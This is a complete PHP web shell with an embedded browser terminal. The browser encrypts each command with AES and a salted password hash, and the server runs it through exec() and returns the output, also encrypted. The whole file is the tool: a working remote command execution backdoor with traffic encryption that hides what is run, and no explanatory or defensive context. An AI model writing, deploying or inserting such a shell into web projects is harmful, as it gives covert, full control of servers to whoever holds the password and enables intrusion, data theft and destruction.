<?php
// php -r "echo hash('sha256','myPassword');" > password.log
$password = '76549b827ec46e705fd03831813fa52172338f0dfcbd711ed44b81a96dac51c6';
if (!function_exists('hash_algos') || !in_array('sha256',hash_algos()) || !is_callable('exec')) {
    accessDenied('Sorry, there are no required dependencies on this server.');
}
$user = false;
if (isset($_POST['data'], $_POST['salt'])) {
    $ts = intval(substr($_POST['salt'],0,10));
    if (64!=strlen($_POST['salt']) || $ts<time()-5 || $ts>time()) accessDenied('Salt is invalid');
    // Decode
    $data = json_decode(AesCtr::decrypt($_POST['data'], hash('sha256',$_POST['salt'].$password), 256), true);
    if (empty($data)) accessDenied('Wrong password');
    set_time_limit(1000);
    $params = array();
    if (!empty($data['cwd'])) @chdir($data['cwd']);
    exec($data['cmd'], $out, $error);
    $params['return'] = $error;
    if (0===$error && preg_match('~^cd\s+(.*)$~i',$data['cmd'],$matches)) {
        @chdir($matches[1]);
        $params['cwd'] = getcwd();
    }
    header('Content-type: application/json');
    exit(AesCtr::encrypt(json_encode(array('out'=>$out)+$params), hash('sha256',$_POST['salt'].$password), 256));
}
if ('POST'==$_SERVER['REQUEST_METHOD']) accessDenied('Authorization required');
function accessDenied($msg){header('HTTP/1.1 403 Forbidden',true,403);exit($msg);}
class Aes { public static function cipher($input, $w) { $Nb = 4; $Nr = count($w)/$Nb - 1; $state = array(); for ($i=0; $i<4*$Nb; $i++) $state[$i%4][floor($i/4)] = $input[$i]; $state = self::addRoundKey($state, $w, 0, $Nb); for ($round=1; $round<$Nr; $round++) { $state = self::subBytes($state, $Nb); $state = self::shiftRows($state, $Nb); $state = self::mixColumns($state, $Nb); $state = self::addRoundKey($state, $w, $round, $Nb); } $state = self::subBytes($state, $Nb); $state = self::shiftRows($state, $Nb); $state = self::addRoundKey($state, $w, $Nr, $Nb); $output = array(4*$Nb); for ($i=0; $i<4*$Nb; $i++) $output[$i] = $state[$i%4][floor($i/4)]; return $output; } private static function addRoundKey($state, $w, $rnd, $Nb) { for ($r=0; $r<4; $r++) { for ($c=0; $c<$Nb; $c++) $state[$r][$c] ^= $w[$rnd*4+$c][$r]; } return $state; } private static function subBytes($s, $Nb) { for ($r=0; $r<4; $r++) { for ($c=0; $c<$Nb; $c++) $s[$r][$c] = self::$sBox[$s[$r][$c]]; } return $s; } private static function shiftRows($s, $Nb) { $t = array(4); for ($r=1; $r<4; $r++) { for ($c=0; $c<4; $c++) $t[$c] = $s[$r][($c+$r)%$Nb]; for ($c=0; $c<4; $c++) $s[$r][$c] = $t[$c]; } return $s; } private static function mixColumns($s, $Nb) { for ($c=0; $c<4; $c++) { $a = array(4); $b = array(4); for ($i=0; $i<4; $i++) { $a[$i] = $s[$i][$c]; $b[$i] = $s[$i][$c]&0x80 ? $s[$i][$c]<<1 ^ 0x011b : $s[$i][$c]<<1; } $s[0][$c] = $b[0] ^ $a[1] ^ $b[1] ^ $a[2] ^ $a[3]; $s[1][$c] = $a[0] ^ $b[1] ^ $a[2] ^ $b[2] ^ $a[3]; $s[2][$c] = $a[0] ^ $a[1] ^ $b[2] ^ $a[3] ^ $b[3]; $s[3][$c] = $a[0] ^ $b[0] ^ $a[1] ^ $a[2] ^ $b[3]; } return $s; } public static function keyExpansion($key) { $Nb = 4; $Nk = count($key)/4; $Nr = $Nk + 6; $w = array(); $temp = array(); for ($i=0; $i<$Nk; $i++) { $r = array($key[4*$i], $key[4*$i+1], $key[4*$i+2], $key[4*$i+3]); $w[$i] = $r; } for ($i=$Nk; $i<($Nb*($Nr+1)); $i++) { $w[$i] = array(); for ($t=0; $t<4; $t++) $temp[$t] = $w[$i-1][$t]; if ($i % $Nk == 0) { $temp = self::subWord(self::rotWord($temp)); for ($t=0; $t<4; $t++) $temp[$t] ^= self::$rCon[$i/$Nk][$t]; } else if ($Nk > 6 && $i%$Nk == 4) { $temp = self::subWord($temp); } for ($t=0; $t<4; $t++) $w[$i][$t] = $w[$i-$Nk][$t] ^ $temp[$t]; } return $w; } private static function subWord($w) { for ($i=0; $i<4; $i++) $w[$i] = self::$sBox[$w[$i]]; return $w; } private static function rotWord($w) { $tmp = $w[0]; for ($i=0; $i<3; $i++) $w[$i] = $w[$i+1]; $w[3] = $tmp; return $w; } private static $sBox = array( 0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76, 0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0, 0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15, 0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75, 0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84, 0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf, 0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8, 0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2, 0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73, 0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb, 0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79, 0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08, 0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a, 0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e, 0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf, 0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16); private static $rCon = array( array(0x00, 0x00, 0x00, 0x00), array(0x01, 0x00, 0x00, 0x00), array(0x02, 0x00, 0x00, 0x00), array(0x04, 0x00, 0x00, 0x00), array(0x08, 0x00, 0x00, 0x00), array(0x10, 0x00, 0x00, 0x00), array(0x20, 0x00, 0x00, 0x00), array(0x40, 0x00, 0x00, 0x00), array(0x80, 0x00, 0x00, 0x00), array(0x1b, 0x00, 0x00, 0x00), array(0x36, 0x00, 0x00, 0x00) ); }
class AesCtr extends Aes { public static function encrypt($plaintext, $password, $nBits) { $blockSize = 16; if (!($nBits==128 || $nBits==192 || $nBits==256)) return ''; $nBytes = $nBits/8; $pwBytes = array(); for ($i=0; $i<$nBytes; $i++) $pwBytes[$i] = ord(substr($password,$i,1)) & 0xff; $key = Aes::cipher($pwBytes, Aes::keyExpansion($pwBytes)); $key = array_merge($key, array_slice($key, 0, $nBytes-16)); $counterBlock = array(); $nonce = floor(microtime(true)*1000); $nonceMs = $nonce%1000; $nonceSec = floor($nonce/1000); $nonceRnd = floor(rand(0, 0xffff)); for ($i=0; $i<2; $i++) $counterBlock[$i] = self::urs($nonceMs, $i*8) & 0xff; for ($i=0; $i<2; $i++) $counterBlock[$i+2] = self::urs($nonceRnd, $i*8) & 0xff; for ($i=0; $i<4; $i++) $counterBlock[$i+4] = self::urs($nonceSec, $i*8) & 0xff; $ctrTxt = ''; for ($i=0; $i<8; $i++) $ctrTxt .= chr($counterBlock[$i]); $keySchedule = Aes::keyExpansion($key); $blockCount = ceil(strlen($plaintext)/$blockSize); $ciphertxt = array(); for ($b=0; $b<$blockCount; $b++) { for ($c=0; $c<4; $c++) $counterBlock[15-$c] = self::urs($b, $c*8) & 0xff; for ($c=0; $c<4; $c++) $counterBlock[15-$c-4] = self::urs($b/0x100000000, $c*8); $cipherCntr = Aes::cipher($counterBlock, $keySchedule); $blockLength = $b<$blockCount-1 ? $blockSize : (strlen($plaintext)-1)%$blockSize+1; $cipherByte = array(); for ($i=0; $i<$blockLength; $i++) { $cipherByte[$i] = $cipherCntr[$i] ^ ord(substr($plaintext, $b*$blockSize+$i, 1)); $cipherByte[$i] = chr($cipherByte[$i]); } $ciphertxt[$b] = implode('', $cipherByte); } $ciphertext = $ctrTxt . implode('', $ciphertxt); $ciphertext = base64_encode($ciphertext); return $ciphertext; } public static function decrypt($ciphertext, $password, $nBits) { $blockSize = 16; if (!($nBits==128 || $nBits==192 || $nBits==256)) return ''; $ciphertext = base64_decode($ciphertext); $nBytes = $nBits/8; $pwBytes = array(); for ($i=0; $i<$nBytes; $i++) $pwBytes[$i] = ord(substr($password,$i,1)) & 0xff; $key = Aes::cipher($pwBytes, Aes::keyExpansion($pwBytes)); $key = array_merge($key, array_slice($key, 0, $nBytes-16)); $counterBlock = array(); $ctrTxt = substr($ciphertext, 0, 8); for ($i=0; $i<8; $i++) $counterBlock[$i] = ord(substr($ctrTxt,$i,1)); $keySchedule = Aes::keyExpansion($key); $nBlocks = ceil((strlen($ciphertext)-8) / $blockSize); $ct = array(); for ($b=0; $b<$nBlocks; $b++) $ct[$b] = substr($ciphertext, 8+$b*$blockSize, 16); $ciphertext = $ct; $plaintxt = array(); for ($b=0; $b<$nBlocks; $b++) { for ($c=0; $c<4; $c++) $counterBlock[15-$c] = self::urs($b, $c*8) & 0xff; for ($c=0; $c<4; $c++) $counterBlock[15-$c-4] = self::urs(($b+1)/0x100000000-1, $c*8) & 0xff; $cipherCntr = Aes::cipher($counterBlock, $keySchedule); $plaintxtByte = array(); for ($i=0; $i<strlen($ciphertext[$b]); $i++) { $plaintxtByte[$i] = $cipherCntr[$i] ^ ord(substr($ciphertext[$b],$i,1)); $plaintxtByte[$i] = chr($plaintxtByte[$i]); } $plaintxt[$b] = implode('', $plaintxtByte); } $plaintext = implode('',$plaintxt); return $plaintext; } private static function urs($a, $b) { $a &= 0xffffffff; $b &= 0x1f; if ($a&0x80000000 && $b>0) { $a = ($a>>1) & 0x7fffffff; $a = $a >> ($b-1); } else { $a = ($a>>$b); } return $a; } }
header("Content-Security-Policy: default-src 'none'; connect-src 'self'; script-src 'unsafe-inline'; style-src 'unsafe-inline';");
header("Content-type: text/html; charset=utf-8");
?>
<!DOCTYPE html>
<html lang="en"><head><title><?=htmlspecialchars($_SERVER['HTTP_HOST'])?></title>
<style>body{margin:0;padding:1%}input,textarea{font-family:monospace;font-size:12px;padding:1%;width:98%}</style>
</head><body>
<textarea rows="20" cols="100" id="s" readonly="readonly"></textarea><input id="c" size="100"/>
<script>
(function(){
var Aes={cipher:function(b,f){for(var a=f.length/4-1,d=[[],[],[],[]],c=0;16>c;c++)d[c%4][Math.floor(c/4)]=b[c];d=Aes.addRoundKey(d,f,0,4);for(c=1;c<a;c++)d=Aes.subBytes(d,4),d=Aes.shiftRows(d,4),d=Aes.mixColumns(d,4),d=Aes.addRoundKey(d,f,c,4);d=Aes.subBytes(d,4);d=Aes.shiftRows(d,4);d=Aes.addRoundKey(d,f,a,4);a=Array(16);for(c=0;16>c;c++)a[c]=d[c%4][Math.floor(c/4)];return a},keyExpansion:function(b){for(var f=b.length/4,a=f+6,d=Array(4*(a+1)),c=Array(4),e=0;e<f;e++)d[e]=[b[4*e],b[4*e+1],b[4*e+2],
b[4*e+3]];for(e=f;e<4*(a+1);e++){d[e]=Array(4);for(b=0;4>b;b++)c[b]=d[e-1][b];if(0==e%f)for(c=Aes.subWord(Aes.rotWord(c)),b=0;4>b;b++)c[b]^=Aes.rCon[e/f][b];else 6<f&&4==e%f&&(c=Aes.subWord(c));for(b=0;4>b;b++)d[e][b]=d[e-f][b]^c[b]}return d},subBytes:function(b,f){for(var a=0;4>a;a++)for(var d=0;d<f;d++)b[a][d]=Aes.sBox[b[a][d]];return b},shiftRows:function(b,f){for(var a=Array(4),d=1;4>d;d++){for(var c=0;4>c;c++)a[c]=b[d][(c+d)%f];for(c=0;4>c;c++)b[d][c]=a[c]}return b},mixColumns:function(b,f){for(var a=
0;4>a;a++){for(var d=Array(4),c=Array(4),e=0;4>e;e++)d[e]=b[e][a],c[e]=b[e][a]&128?b[e][a]<<1^283:b[e][a]<<1;b[0][a]=c[0]^d[1]^c[1]^d[2]^d[3];b[1][a]=d[0]^c[1]^d[2]^c[2]^d[3];b[2][a]=d[0]^d[1]^c[2]^d[3]^c[3];b[3][a]=d[0]^c[0]^d[1]^d[2]^c[3]}return b},addRoundKey:function(b,f,a,d){for(var c=0;4>c;c++)for(var e=0;e<d;e++)b[c][e]^=f[4*a+e][c];return b},subWord:function(b){for(var f=0;4>f;f++)b[f]=Aes.sBox[b[f]];return b},rotWord:function(b){for(var f=b[0],a=0;3>a;a++)b[a]=b[a+1];b[3]=f;return b},sBox:[99,
124,119,123,242,107,111,197,48,1,103,43,254,215,171,118,202,130,201,125,250,89,71,240,173,212,162,175,156,164,114,192,183,253,147,38,54,63,247,204,52,165,229,241,113,216,49,21,4,199,35,195,24,150,5,154,7,18,128,226,235,39,178,117,9,131,44,26,27,110,90,160,82,59,214,179,41,227,47,132,83,209,0,237,32,252,177,91,106,203,190,57,74,76,88,207,208,239,170,251,67,77,51,133,69,249,2,127,80,60,159,168,81,163,64,143,146,157,56,245,188,182,218,33,16,255,243,210,205,12,19,236,95,151,68,23,196,167,126,61,100,93,
25,115,96,129,79,220,34,42,144,136,70,238,184,20,222,94,11,219,224,50,58,10,73,6,36,92,194,211,172,98,145,149,228,121,231,200,55,109,141,213,78,169,108,86,244,234,101,122,174,8,186,120,37,46,28,166,180,198,232,221,116,31,75,189,139,138,112,62,181,102,72,3,246,14,97,53,87,185,134,193,29,158,225,248,152,17,105,217,142,148,155,30,135,233,206,85,40,223,140,161,137,13,191,230,66,104,65,153,45,15,176,84,187,22],rCon:[[0,0,0,0],[1,0,0,0],[2,0,0,0],[4,0,0,0],[8,0,0,0],[16,0,0,0],[32,0,0,0],[64,0,0,0],[128,
0,0,0],[27,0,0,0],[54,0,0,0]],Ctr:{}};
Aes.Ctr.encrypt=function(b,f,a){if(128!=a&&192!=a&&256!=a)return"";b=Utf8.encode(b);f=Utf8.encode(f);var d=a/8,c=Array(d);for(a=0;a<d;a++)c[a]=isNaN(f.charCodeAt(a))?0:f.charCodeAt(a);c=Aes.cipher(c,Aes.keyExpansion(c));c=c.concat(c.slice(0,d-16));f=Array(16);a=(new Date).getTime();var d=a%1E3,e=Math.floor(a/1E3),l=Math.floor(65535*Math.random());for(a=0;2>a;a++)f[a]=d>>>8*a&255;for(a=0;2>a;a++)f[a+2]=l>>>8*a&255;for(a=0;4>a;a++)f[a+4]=e>>>8*a&255;d="";for(a=0;8>a;a++)d+=String.fromCharCode(f[a]);
for(var c=Aes.keyExpansion(c),e=Math.ceil(b.length/16),l=Array(e),k=0;k<e;k++){for(a=0;4>a;a++)f[15-a]=k>>>8*a&255;for(a=0;4>a;a++)f[15-a-4]=k/4294967296>>>8*a;var g=Aes.cipher(f,c),m=k<e-1?16:(b.length-1)%16+1,h=Array(m);for(a=0;a<m;a++)h[a]=g[a]^b.charCodeAt(16*k+a),h[a]=String.fromCharCode(h[a]);l[k]=h.join("")}b=d+l.join("");return b=Base64.encode(b)};
Aes.Ctr.decrypt=function(b,f,a){if(128!=a&&192!=a&&256!=a)return"";b=Base64.decode(b);f=Utf8.encode(f);var d=a/8,c=Array(d);for(a=0;a<d;a++)c[a]=isNaN(f.charCodeAt(a))?0:f.charCodeAt(a);c=Aes.cipher(c,Aes.keyExpansion(c));c=c.concat(c.slice(0,d-16));f=Array(8);ctrTxt=b.slice(0,8);for(a=0;8>a;a++)f[a]=ctrTxt.charCodeAt(a);d=Aes.keyExpansion(c);c=Math.ceil((b.length-8)/16);a=Array(c);for(var e=0;e<c;e++)a[e]=b.slice(8+16*e,16*e+24);b=a;for(var l=Array(b.length),e=0;e<c;e++){for(a=0;4>a;a++)f[15-a]=
e>>>8*a&255;for(a=0;4>a;a++)f[15-a-4]=(e+1)/4294967296-1>>>8*a&255;var k=Aes.cipher(f,d),g=Array(b[e].length);for(a=0;a<b[e].length;a++)g[a]=k[a]^b[e].charCodeAt(a),g[a]=String.fromCharCode(g[a]);l[e]=g.join("")}b=l.join("");return b=Utf8.decode(b)};
var Base64={code:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(b,f){var a,d,c,e,l=[],k="",g,m,h=Base64.code;m=("undefined"==typeof f?0:f)?b.encodeUTF8():b;g=m.length%3;if(0<g)for(;3>g++;)k+="=",m+="\x00";for(g=0;g<m.length;g+=3)a=m.charCodeAt(g),d=m.charCodeAt(g+1),c=m.charCodeAt(g+2),e=a<<16|d<<8|c,a=e>>18&63,d=e>>12&63,c=e>>6&63,e&=63,l[g/3]=h.charAt(a)+h.charAt(d)+h.charAt(c)+h.charAt(e);l=l.join("");return l=l.slice(0,l.length-k.length)+k},decode:function(b,
f){f="undefined"==typeof f?!1:f;var a,d,c,e,l,k=[],g,m=Base64.code;g=f?b.decodeUTF8():b;for(var h=0;h<g.length;h+=4)a=m.indexOf(g.charAt(h)),d=m.indexOf(g.charAt(h+1)),e=m.indexOf(g.charAt(h+2)),l=m.indexOf(g.charAt(h+3)),c=a<<18|d<<12|e<<6|l,a=c>>>16&255,d=c>>>8&255,c&=255,k[h/4]=String.fromCharCode(a,d,c),64==l&&(k[h/4]=String.fromCharCode(a,d)),64==e&&(k[h/4]=String.fromCharCode(a));e=k.join("");return f?e.decodeUTF8():e}},Utf8={encode:function(b){b=b.replace(/[\u0080-\u07ff]/g,function(b){b=b.charCodeAt(0);
return String.fromCharCode(192|b>>6,128|b&63)});return b=b.replace(/[\u0800-\uffff]/g,function(b){b=b.charCodeAt(0);return String.fromCharCode(224|b>>12,128|b>>6&63,128|b&63)})},decode:function(b){b=b.replace(/[\u00e0-\u00ef][\u0080-\u00bf][\u0080-\u00bf]/g,function(b){b=(b.charCodeAt(0)&15)<<12|(b.charCodeAt(1)&63)<<6|b.charCodeAt(2)&63;return String.fromCharCode(b)});return b=b.replace(/[\u00c0-\u00df][\u0080-\u00bf]/g,function(b){b=(b.charCodeAt(0)&31)<<6|b.charCodeAt(1)&63;return String.fromCharCode(b)})}};
var Sha256={hash:function(a,e){("undefined"==typeof e||e)&&(a=Utf8.encode(a));var g=[1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,
2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298],b=[1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225];a+=String.fromCharCode(128);for(var h=Math.ceil((a.length/4+2)/16),k=Array(h),f=0;f<h;f++){k[f]=Array(16);for(var d=0;16>d;d++)k[f][d]=a.charCodeAt(64*
f+4*d)<<24|a.charCodeAt(64*f+4*d+1)<<16|a.charCodeAt(64*f+4*d+2)<<8|a.charCodeAt(64*f+4*d+3)}k[h-1][14]=8*(a.length-1)/Math.pow(2,32);k[h-1][14]=Math.floor(k[h-1][14]);k[h-1][15]=8*(a.length-1)&4294967295;for(var d=Array(64),l,n,p,s,m,q,r,t,f=0;f<h;f++){for(var c=0;16>c;c++)d[c]=k[f][c];for(c=16;64>c;c++)d[c]=Sha256.sigma1(d[c-2])+d[c-7]+Sha256.sigma0(d[c-15])+d[c-16]&4294967295;l=b[0];n=b[1];p=b[2];s=b[3];m=b[4];q=b[5];r=b[6];t=b[7];for(c=0;64>c;c++){var u=t+Sha256.Sigma1(m)+Sha256.Ch(m,q,r)+g[c]+
d[c],v=Sha256.Sigma0(l)+Sha256.Maj(l,n,p);t=r;r=q;q=m;m=s+u&4294967295;s=p;p=n;n=l;l=u+v&4294967295}b[0]=b[0]+l&4294967295;b[1]=b[1]+n&4294967295;b[2]=b[2]+p&4294967295;b[3]=b[3]+s&4294967295;b[4]=b[4]+m&4294967295;b[5]=b[5]+q&4294967295;b[6]=b[6]+r&4294967295;b[7]=b[7]+t&4294967295}return Sha256.toHexStr(b[0])+Sha256.toHexStr(b[1])+Sha256.toHexStr(b[2])+Sha256.toHexStr(b[3])+Sha256.toHexStr(b[4])+Sha256.toHexStr(b[5])+Sha256.toHexStr(b[6])+Sha256.toHexStr(b[7])},ROTR:function(a,e){return e>>>a|e<<
32-a},Sigma0:function(a){return Sha256.ROTR(2,a)^Sha256.ROTR(13,a)^Sha256.ROTR(22,a)},Sigma1:function(a){return Sha256.ROTR(6,a)^Sha256.ROTR(11,a)^Sha256.ROTR(25,a)},sigma0:function(a){return Sha256.ROTR(7,a)^Sha256.ROTR(18,a)^a>>>3},sigma1:function(a){return Sha256.ROTR(17,a)^Sha256.ROTR(19,a)^a>>>10},Ch:function(a,e,g){return a&e^~a&g},Maj:function(a,e,g){return a&e^a&g^e&g},toHexStr:function(a){for(var e="",g,b=7;0<=b;b--)g=a>>>4*b&15,e+=g.toString(16);return e}};    function _(s) { return document.getElementById(s); }
    function ready(salt) {
        try {if (this.readyState === 4) {
            if (this.status === 200) {
                var v = JSON.parse(Aes.Ctr.decrypt(this.responseText, Sha256.hash(salt+getPassword()), 256));
                if (v.cwd) {
                    cwd = v.cwd;
                    _('c').placeholder = cwd;
                }
                if (v.return) {
                    _('s').value += '(FAILED)'+"\n";
                }
                _('s').value += (('object'==typeof(v)) ? v.out.join("\n") : v) + "\n";
                _('s').scrollTop = 1000000;
            }
            if (this.status === 403) {
                password = false;
                _('s').value = '';
                alert(this.responseText);
            }
        }} catch(e) { alert('Caught Exception: ' + e.description); }
    }
    function getSalt() {
        var salt='';
        for(var i=0; i<100000; i++) salt += String.fromCharCode(32+Math.round(Math.random()*94));
        return Math.round((new Date).getTime()/1000 - timeDelta) + Sha256.hash(salt).substring(10);
    }
    function send() {
        var x=new XMLHttpRequest(), pw=getPassword(), salt=getSalt();
        if (!pw) return;
        x.open('POST','<?=$_SERVER['PHP_SELF']?>',true);
        x.onreadystatechange = ((function(x,salt){return function(){ready.call(x,salt)}})(x,salt));
        var data={cmd:_('c').value,cwd:cwd};
        x.setRequestHeader("Content-Type", 'application/x-www-form-urlencoded');
        x.send('salt='+encodeURIComponent(salt)
            +'&data='+encodeURIComponent(Aes.Ctr.encrypt(JSON.stringify(data), Sha256.hash(salt+pw), 256)));
        _('s').value += '$ '+_('c').value+"\n";
    }
    var password = false, cwd = false, history = [], current = 0, timeDelta=(new Date).getTime()/1000-<?=time()?>;
    function getPassword() {
        if (password) return password;
        var c = prompt('Enter a password:');
        if (c && c.length) password = Sha256.hash(c);
        return password;
    }
    _('c').onkeydown=function(e){
        if (13==e.keyCode) {
            if (_('c').value.length) history.push(_('c').value);
            send();
            current = history.length-1;
            _('c').value = '';
        }
        if (38==e.keyCode) {
            current--;
            if (current==-1) return _('c').value = '';
            if (current<-1) current = history.length-1;
            if (history[current]) _('c').value = history[current];
        }
        if (40==e.keyCode) {
            current++;
            if (current==history.length) return _('c').value = '';
            if (current>history.length) current=0;
            if (history[current]) _('c').value = history[current];
        }
    };
    _('c').focus();
})();
</script>
</body></html>